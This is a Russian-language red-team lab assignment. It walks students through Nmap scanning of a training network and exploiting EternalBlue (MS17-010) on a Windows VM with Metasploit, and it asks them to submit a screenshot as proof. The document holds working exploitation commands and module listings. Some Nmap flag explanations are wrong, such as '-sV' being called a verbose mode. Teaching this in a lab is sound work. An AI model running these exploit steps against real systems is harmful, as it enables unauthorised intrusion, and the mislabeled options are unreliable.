# Практическое задание: кейс Red Team

Давайте потренируемся на реальном кейсе получения удалённого доступа к серверной платформе.
Не стоит обращать внимание на старую версию операционной системы. Дело в том, что во многих крупных организациях инфраструктура создавалась десятки лет назад и IT-подразделения не торопятся обновлять операционные системы по принципу «пока работает — не трогай». От этого выполнение задания будет только интереснее.
Цель работы

    Изучить базовые команды работы с эксплойтами Metasploit Framework.
    Просканировать учебную локальную сеть.
    Выявить компьютер с уязвимостью EternalBlue.
    Провести эксплуатацию этой уязвимости и сделать скриншот экрана.

## Подготовительный этап занятия

Необходимо развернуть две виртуальные машины.

- [x] Одну с операционной системой Microsoft Windows,
- [x] другую с операционной системой Kali Linux.
- [ ] На операционной системе семейства Microsoft Windows Server 2008 отключить все антивирусные средства.

[Ссылка на виртуальную машину](https://disk.yandex.ru/d/QN6BMo3JhEaLMQ)

## Задачи, выполняемые в рамках работы

Главная задача — научиться выполнять сканирование учебной локальной сети для выявления доступных хостов.
Пример команды для выполнения ping-сканирования сети:

```bash
Nmap -sP 192.168.1.0/24
```

`-sP` — эта опция указывает Nmap произвести пинг-сканирование (определение хостов), а затем вывести список доступных хостов, т. е. тех, которые ответили на запросы. Определение маршрутов и NSE-скрипты также используются, если необходимо, однако дальнейшее тестирование (например сканирование портов или определение ОС) не производится. По умолчанию эта опция считается как бы на один шаг более тщательной, чем сканирование для составления простого списка хостов, и может быть использована в этих же целях. Она позволяет произвести исследование целевой сети без привлечения внимания.

## Следующим этапом будет сканирование уже найденных хостов с целью определения нужных портов для эксплуатации уязвимости EternalBlue.

Эксплойт EternalBlue использует уязвимость в реализации протокола Server Message Block v1 (SMB). Злоумышленник, сформировав и передав на удалённый узел особым образом подготовленный пакет, может получить удалённый доступ к системе и запустить на ней произвольный код.

Компания-разработчик Microsoft подтвердила, что уязвимости подвержены все версии Windows — начиная с Windows XP и заканчивая Windows Server 2016 — то есть уязвимость оставалась неисправленной на протяжении по крайней мере 16 лет. Она была устранена в серии обновлений MS17-010.

Первое публичное использование эксплойта EternalBlue было зарегистрировано 21 апреля 2017 года, когда программа-бэкдор DoublePulsar, основанная на коде АНБ, поразила свыше 200 тыс. компьютеров в течение нескольких дней. 12 мая 2017 года появился шифровальщик WannaCry, использовавший эксплойт EternalBlue и код DoublePulsar, который поразил десятки тысяч компьютеров в Интернете. Размах атаки был настолько обширен, что побудил Microsoft выпустить обновления к неподдерживаемым ОС Windows XP/Windows Server 2003 и Windows 8.

Пример команды для выполнения сканирования ранее найденных хостов:

```bash
Nmap -sV <ip-адрес>
```

Где `-sV` — команда использовать режим «подробного отчёта». Эту опцию рекомендуется использовать в любых случаях, поскольку при этом Nmap подробно сообщает о ходе выполнения текущей операции.

Наша цель — найти компьютер с открытым портом 445 под управлением операционной системы Microsoft Windows XP.

## Далее приступаем к самой эксплуатации уязвимости. Для этого выполняем следующие команды на Kali Linux:

```
Msfconsole
 search ms17-010
 Matching Modules
================
    #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

use 2
set RHOST <найденный ip-адрес>
exploit
screenshot
```

Выполнение указанных выше команд позволит вам получить удалённый доступ к рабочему месту, подверженному уязвимости Eternal Blue.

Теперь можно с уверенностью сказать, что начальные навыки по проверке уязвимости рабочих мест и серверов вы получили. Надеемся, что эти навыки помогут вам в дальнейшем более детально погрузиться в аспекты работы Red Team.

## Условия реализации

В предлагаемую форму для ввода приложите сделанный скриншот.
